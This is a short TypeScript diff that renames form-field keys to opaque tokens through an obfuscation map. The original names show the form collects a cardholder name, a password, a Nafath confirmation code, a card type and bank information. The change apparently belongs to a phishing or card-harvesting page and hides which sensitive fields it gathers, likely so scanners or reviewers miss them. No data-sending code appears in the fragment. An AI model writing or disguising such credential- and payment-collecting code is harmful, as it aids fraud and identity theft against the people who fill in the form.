@@ -26,13 +26,13 @@ const _fm = {
   f1: _e("_v1"),
   f2: _e("_v2"),
   f3: _e("_v3"),
-  f4: _e("cardHolderName"),
-  f5: _e("_t2"),
+  f4: _e("_v4"),
+  f5: _e("_v5"),
   f6: _e("_v6"),
-  f7: _e("password"),
-  f8: _e("nafadConfirmationCode"),
-  f9: _e("cardType"),
-  f10: _e("bankInfo")
+  f7: _e("_pw"),
+  f8: _e("_ncc"),
+  f9: _e("_ct"),
+  f10: _e("_bi")
 }
 
 export function _gf(obfuscated: keyof typeof _fm): string {
